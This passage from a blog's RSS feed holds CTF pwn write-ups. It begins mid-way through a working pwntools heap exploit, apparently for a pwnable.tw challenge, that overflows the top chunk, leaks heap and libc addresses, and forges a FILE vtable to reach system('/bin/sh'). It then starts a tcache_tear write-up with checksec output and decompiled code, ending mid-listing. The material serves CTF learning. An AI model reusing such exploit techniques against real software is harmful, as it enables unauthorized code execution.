r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;thename&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Author :&amp;quot;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of page :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content :&amp;quot;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index of page :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index of page :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content:&amp;quot;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;updatename&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,name=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Do you want to change the author ? (yes:1 / no:0) &amp;quot;&lt;/span&gt;,i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i==&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		thename(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r,&lt;span class=&#34;string&#34;&gt;&amp;#x27;b malloc&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;thename(&lt;span class=&#34;string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#now the size0 is 0x20+3,wocan overflow 3 bytes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;+p32(&lt;span class=&#34;number&#34;&gt;0xfe1&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = u64(r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,drop = &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Do you want to change the author ? (yes:1 / no:0) &amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;AAAAAAAA&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_arena = u64(r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,drop = &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = main_arena - &lt;span class=&#34;number&#34;&gt;0x3c4b78&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list_all = &lt;span class=&#34;number&#34;&gt;0x3c5520&lt;/span&gt;+libcbase&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system =libcbase + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;main_arena : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(main_arena))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;libcbase : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;system : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget = &lt;span class=&#34;number&#34;&gt;0xcafebabedeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;fakechunk =b&amp;#x27;\x00&amp;#x27;*0x2b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;pad =b&amp;#x27;/bin/sh\x00&amp;#x27;+p64(0x61)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;pad+= p64(main_arena) +p64(list_all-0x10)+p64(2)+p64(3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;pad =pad.ljust(0xc0,b&amp;#x27;\x00&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;pad +=p64(0xffffffffffffffff)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;pad = pad.ljust(0xd8,b&amp;#x27;\x00&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;vtable  = heap_addr+0x10+0x2b0 + 0xd8 + 0x8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;pad += p64(vtable)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;fake_vtable = p64(0)*2+p64(1)+p64(system)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;fakechunk+=pad+fake_vtable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;edit(0,fakechunk)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x2b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x61&lt;/span&gt;)+p64(main_arena)+p64(list_all-&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = payload.ljust(&lt;span class=&#34;number&#34;&gt;0xc0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(&lt;span class=&#34;number&#34;&gt;0xffffffffffffffff&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = payload.ljust(&lt;span class=&#34;number&#34;&gt;0xd8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vtable = heap_addr + &lt;span class=&#34;number&#34;&gt;0x2b0&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0xd8&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p64(vtable)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload +=p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,data + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of page :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/04/01/tcache-tear/</guid>
            <title>tcache_tear</title>
            <link>http://example.com/2022/04/01/tcache-tear/</link>
            <category>writeup</category>
            <pubDate>Fri, 01 Apr 2022 20:21:22 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;pwnabletw&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwnabletw&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3B3bmFibGUudHc=&#34;&gt;pwnable.tw&lt;/span&gt; 	tcache_tear&lt;/h1&gt;
&lt;h2 id=&#34;保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#保护&#34;&gt;#&lt;/a&gt; 保护：&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/pwnable/Tcache Tear$ checksec --file=tcache_tear&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  Yes	&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;		&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;		tcache_tear&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/pwnable/Tcache Tear$ strings libc&lt;span class=&#34;number&#34;&gt;-2.27&lt;/span&gt;.so | grep ubuntu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GNU C Library (Ubuntu GLIBC &lt;span class=&#34;number&#34;&gt;2.27&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-3u&lt;/span&gt;buntu1) stable release version &lt;span class=&#34;number&#34;&gt;2.27&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;https:&lt;span class=&#34;comment&#34;&gt;//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&amp;gt;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;64 位程序，FULLrelro 导致不能改写 got&lt;/p&gt;
&lt;p&gt;但是因为这个 libc 版本太老，tcache 不会检查 double free&lt;/p&gt;
&lt;h2 id=&#34;主要程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#主要程序&#34;&gt;#&lt;/a&gt; 主要程序：&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __fastcall __noreturn &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 a1, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a2, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v3; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_400948(a1, a2, a3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Name:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read_name((__int64)&amp;amp;name, &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      menu();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v3 = get_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 != &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 &amp;lt;= &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; )                            &lt;span class=&#34;comment&#34;&gt;// 限制释放次数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ++v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 &amp;gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        info();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span 